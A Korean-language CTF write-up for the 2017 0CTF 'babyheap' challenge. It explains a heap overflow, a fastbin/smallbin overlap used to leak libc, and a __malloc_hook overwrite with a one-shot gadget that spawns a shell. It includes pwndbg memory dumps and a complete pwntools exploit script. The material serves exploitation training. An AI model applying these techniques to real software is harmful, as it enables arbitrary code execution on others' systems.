# 2017_0ctf_babyheap

## Key words

- pwnable
- x86_64 | NX | PIE | FULL RELRO
- heap (fastbin, smallbin overlay)

## Solution

문제는 일반적인 힙 문제로 4개의 메뉴가 주어 집니다.

1. Alloc
  - Size를 입력 받고 calloc 힙 메모리를 할당
  - calloc : 할당된 메모리의 내용을 0 으로 초기화
2. Fill
  - 인덱스를 입력 받고 사이즈를 입력 받아 내용을 넣음
  - 이 부분에서 초기에 할당된 사이즈와 비교를 하지 않기 때문에 `오버플로우 버그가 발생`
3. Free
  - 인덱스를 입력받아 해당 힙 메모리를 해제
4. Dump
  - 인덱스를 입력받아 (1) 에서 할당했던 사이즈 만큼 출력

여기까지, 우리는 2가지 작업을 진행해야 합니다.

1. 주소 노출 버그 찾기
  - 해당 버그를 이용하여 libc 기본 주소를 찾기
2. FULL RELRO
  - @got를 덮어 쓸수 없음
  - libc에 존재하는 특수한 값들을 조작 (\__malloc_hook, \__free_hook)

먼저, 주소를 노출 시켜야 하는데 할당이 `calloc`으로 진행이 되기 때문에 중간에 `FD`, `BK`등을 강제로 생성해서 노출 시키는 것이 힘듭니다.

`uaf.io`에서는 이를 위해 `fast bin`과 `small bin`을 동일한 주소에 동시에 할당 시키고, `small bin`을 해제 하여 발생되는 `FD`값을 `fast bin` 청크를 이용하여 노출 시킵니다. [1]

먼저, 4개의 `fast bin` (0x20)과 1개의 `small bin` (0x80)을 생성하면 다음과 같습니다.

```
0x555555757000:	0x0000000000000000	0x0000000000000031  (idx 0)
0x555555757010:	0x0000000000000000	0x0000000000000000
0x555555757020:	0x0000000000000000	0x0000000000000000
0x555555757030:	0x0000000000000000	0x0000000000000031  (idx 1)
0x555555757040:	0x0000000000000000	0x0000000000000000
0x555555757050:	0x0000000000000000	0x0000000000000000
0x555555757060:	0x0000000000000000	0x0000000000000031  (idx 2)
0x555555757070:	0x0000000000000000	0x0000000000000000
0x555555757080:	0x0000000000000000	0x0000000000000000
0x555555757090:	0x0000000000000000	0x0000000000000031  (idx 3)
0x5555557570a0:	0x0000000000000000	0x0000000000000000
0x5555557570b0:	0x0000000000000000	0x0000000000000000
0x5555557570c0:	0x0000000000000000	0x0000000000000091  (idx 4)
0x5555557570d0:	0x0000000000000000	0x0000000000000000
0x5555557570e0:	0x0000000000000000	0x0000000000000000
```

각각의 목적은 다음과 같습니다.

1. idx 0: fill을 이용하여 idx 3의 FD를 idx 4(`small bin`)의 데이터 쪽으로 조작
2. idx 1, idx 2: 2개의 힙 덩어리를 해제 하여, `FD`를 입에 노출
3. idx 3: idx 4 쪽에 정상적으로 할당되기 위해 fill 을 이용하여 idx 4의 사이즈를 조정
4. idx 4: `small bin`을 해제 하여 `FD`를 데이터 영역에 남기고 동일한 위치에 할당된 `fast bin`을 이용하여 `FD`를 노출

따라서, 순서는 2 -> 1 -> 3-> 4 의 순서가 되고 중간 중간에 몇 가지 추가 적인 작업이 있습니다.

(순서 2) idx 1과 idx 2를 해제 하면 다음과 같습니다.

```
0x555555757000:	0x0000000000000000	0x0000000000000031 (idx 0)
0x555555757010:	0x0000000000000000	0x0000000000000000
0x555555757020:	0x0000000000000000	0x0000000000000000
0x555555757030:	0x0000000000000000	0x0000000000000031 (freed)
0x555555757040:	0x0000000000000000	0x0000000000000000
0x555555757050:	0x0000000000000000	0x0000000000000000
0x555555757060:	0x0000000000000000	0x0000000000000031 (freed)
0x555555757070:	0x0000555555757030	0x0000000000000000
0x555555757080:	0x0000000000000000	0x0000000000000000
0x555555757090:	0x0000000000000000	0x0000000000000031 (idx 3)
0x5555557570a0:	0x0000000000000000	0x0000000000000000
0x5555557570b0:	0x0000000000000000	0x0000000000000000
0x5555557570c0:	0x0000000000000000	0x0000000000000091 (idx 4)
0x5555557570d0:	0x0000000000000000	0x0000000000000000

pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x555555757060 —▸ 0x555555757030 ◂— 0x0
```

위 내용을 통해, bins를 확인하면 0x2X를 2번 할당 하면 처음에 `0x555555757060`에 할당이 되고 그 다음에 `0x555555757030`에 할당이 됩니다.

(순서 1) `idx 0` 을 이용하여 `0x555555757070` 위치에 최하위 바이트인 `0x30`을 `0xc0`로 바꿉니다.

원래는 0x2X를 2번 할당하면 `0x555555757060`에 먼저 할당이 되고, `0x555555757030`에 할당이 되어야 하지만 `(순서 1)` 작업을 통해 처음에 할당을 하면 `0x555555757060`에 할당이 되고, 할당 시, `FD`의 내용을 리스트에 넣기 때문에 다음에 할당 되는 위치가 `0x5555557570c0`가 되며, 이 위치는 idx 4인 small bin과 겹치게 됩니다.

한 가지, 주의할 점은 (순서 1)을 한 뒤, `small bin`에 중첩 하기 위해 0x2X사이즈로 두 번 할당 할 경우, `small bin`->size = 0x91 이기 때문에 사이즈가 맞지 않아 에러가 발생하게 됩니다.

따라서, 할당 하기 전에 먼저 `small bin`->size 역시 0x31로 변경한 뒤에 할당을 진행합니다.

`fast bin` 0x2X 청크 2개를 할당하면 다음과 같습니다.

```
0x555555757000:	0x0000000000000000	0x0000000000000031  (idx 0)
0x555555757010:	0x0000000000000000	0x0000000000000000
0x555555757020:	0x0000000000000000	0x0000000000000000
0x555555757030:	0x0000000000000000	0x0000000000000031
0x555555757040:	0x0000000000000000	0x0000000000000000
0x555555757050:	0x0000000000000000	0x0000000000000000
0x555555757060:	0x0000000000000000	0x0000000000000031  (idx 1)
0x555555757070:	0x0000000000000000	0x0000000000000000
0x555555757080:	0x0000000000000000	0x0000000000000000
0x555555757090:	0x0000000000000000	0x0000000000000031  (idx 3)
0x5555557570a0:	0x0000000000000000	0x0000000000000000
0x5555557570b0:	0x0000000000000000	0x0000000000000000
0x5555557570c0:	0x0000000000000000	0x0000000000000031  (idx 4, idx 2)
0x5555557570d0:	0x0000000000000000	0x0000000000000000
0x5555557570e0:	0x0000000000000000	0x0000000000000000
0x5555557570f0:	0x0000000000000000	0x0000000000000000
0x555555757100:	0x0000000000000000	0x0000000000000000
0x555555757110:	0x0000000000000000	0x0000000000000000
0x555555757120:	0x0000000000000000	0x0000000000000000
0x555555757130:	0x0000000000000000	0x0000000000000000
0x555555757140:	0x0000000000000000	0x0000000000000000
0x555555757150:	0x0000000000000000	0x0000000000020eb1
```

보시면 `idx 4` = `small bin`, `idx 2` = `fast bin` 두개가 겹친것을 확인 할 수 있습니다.

이제 `small bin`을 해제하여 `FD`를 남기게 되면 `idx 2`의 데이터 영역에 남게 되고 `idx 2`를 이용하여 이를 노출 시킬 수 있습니다.

이 때, 한 가지 작업을 해야 하는 것은 지금 `small bin`이 한개 뿐 이기 때문에, 해제를 해도 `FD`가 남지 않게 됩니다. 따라서 `FD`를 남기게 하기 위해 더미 `small bin`을 하나 생성하고 해제 합니다.

그리고 `idx 2`를 하게 되면 `FD`가 노출 되게 되고, 이를 이용하여 `libc base 주소`, `one_shot gadget`주소를 얻을 수 있습니다.

이제, 실행 흐름을 바꿔야 하는데 `malloc`과 `free`에는 이러한 실행 흐름 변경을 위한 트릭이 존재하는데 바로 `__malloc_hook`과 `__free_hook`입니다.

이 두 가지 훅 주소는 포인터를 갖으며, 만약 NULL이 아닌 경우 해당 포인터를 함수 포인터로 사용하게 됩니다. 따라서, 우리는 이 둘 중 하나의 포인터를 `one_shot gadget`주소로 변경하고 해당 함수를 호출해 주면 됩니다.

여기서는 `__malloc_hook`을 사용해 보도록 하겠습니다. `__malloc_hook`의 위치는 `main_arena - 0x10`에 위치합니다.

먼저, `__malloc_hook` 근처 메모리를 보도록 하겠습니다.

```
pwndbg> x/40gx 0x7ffff7dd1b20-0x40
0x7ffff7dd1ae0 :	0x0000000000000000	0x0000000000000000
0x7ffff7dd1af0 :	0x00007ffff7dd0260	0x0000000000000000
0x7ffff7dd1b00 :	0x00007ffff7a92e20	0x00007ffff7a92a00
0x7ffff7dd1b10 <__malloc_hook>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b20 <main_arena>   :	0x0000000000000000	0x0000000000000000
```

`__malloc_hook`을 덮어 쓰기 위해서 약간의 문제가 생깁니다. `__malloc_hook` 위치를 덮어 쓰기 위해, 이 위치의 `-0x10` 위치에 malloc이 되어야 하고 `-0x08`위치에 할당하는 사이즈가 있어야 하는데, 메모리 덤프 내용은 너무 크거나 0으로 되어 있어서 적절한 값을 찾기가 어렵습니다.

여기서의 트릭은 주소를 약간 비틀어서 `0x7f`를 사이즈로 오게끔 하여 할당하는 방법입니다.

```
pwndbg> x/40gx 0x7ffff7dd1aed
0x7ffff7dd1aed:	0xfff7dd0260000000	0x000000000000007f
0x7ffff7dd1afd:	0xfff7a92e20000000	0xfff7a92a0000007f
0x7ffff7dd1b0d:	0x000000000000007f	0x0000000000000000
0x7ffff7dd1b1d:	0x0000000000000000	0x0000000000000000
```

만약, 0x6X 사이즈를 할당 한다면 해더에 존재하는 사이즈는 0x7X가 되어야 합니다. `0x7ffff7dd1aed`에 할당 한다고 가정 하면 이 위치의 `+0x8`이 `0x7f`가 되어 정확하게 할당이 될 수 있고, 약간의 더미를 추가하여 `__malloc_hook (0x7ffff7dd1b10)`을 덮어 쓸수 있습니다.

그 이후로는 `__malloc_hook`을 `one_shot`으로 덮어 쓰고, malloc을 일으키는 동작을 하게 되면 쉘을 얻을 수 있게 됩니다.

```python
from pwn import *

context(arch='amd64', os='linux')

target = "./babyheap"

p = process(target)

def fn_alloc(size):
	p.sendline("1")
	print p.recv()

	p.sendline(str(size))
	print p.recv(timeout=0.5)

def fn_free(idx):
	p.sendline("3")
	print p.recv()

	p.sendline(str(idx))
	print p.recv()

def fn_fill(idx, size, content):
	p.sendline("2")
	print p.recv()

	p.sendline(str(idx))
	print p.recv()

	p.sendline(str(size))
	print p.recv()

	p.send(content)
	print p.recv()

def fn_dump(idx):
	p.sendline("4")
	print p.recv()

	p.sendline(str(idx))
	recv = p.recv()
	return recv

def leak(addr, size):
	print hexdump(p.leak(addr, size))

print p.recv()

heap_base = 0x555555757000

fn_alloc(0x20) # idx : 0 (0x...00)
fn_alloc(0x20) # idx : 1 (0x...30)
fn_alloc(0x20) # idx : 2 (0x...60)
fn_alloc(0x20) # idx : 3 (0x...90)
fn_alloc(0x80) # idx : 4 (0x...c0)

fn_free(1) # del [1]
fn_free(2) # del [2, 1]

payload = ""
payload += p64(0) * 5
payload += p64(0x31)
payload += p64(0) * 5
payload += p64(0x31)
payload += p8(0xc0)

fn_fill(0, len(payload), payload)

#leak(heap_base, 0x100)

payload = ""
payload += p64(0) * 5
payload += p64(0x31)
fn_fill(3, len(payload), payload)

fn_alloc(0x20)
fn_alloc(0x20)

payload = ""
payload += p64(0) * 5
payload += p64(0x91)
fn_fill(3, len(payload), payload)
fn_alloc(0x80) # to create FD, BK in idx:4

fn_free(4)

recv = fn_dump(2)
libc_base = u64(recv.split("\x0a")[1][:6].ljust(8, "\x00")) - 0x3c4b78
one_shot  = libc_base + 0x4526a
__malloc_hook = libc_base + 0x3c4b10
size_7f = __malloc_hook - 0x23

print "libc base : {}".format(hex(libc_base))

fn_alloc(0x68) # idx 4
fn_free(4)     # del [4] <-- but UAF by idx 2

payload = p64(size_7f)
fn_fill(2, len(payload), payload)

fn_alloc(0x60)
fn_alloc(0x60) # idx 6 <-- will overwrite __malloc_hook

payload = ""
payload += "\x00" * 3
payload += p64(0) * 2
payload += p64(one_shot) # __malloc_hook
fn_fill(6, len(payload), payload)

fn_alloc(0x50)

p.interactive()
```

## Reference

[1] uaf.io : http://uaf.io/exploitation/misc/2016/09/10/Kernel-Exploitation-for-Dummies.html
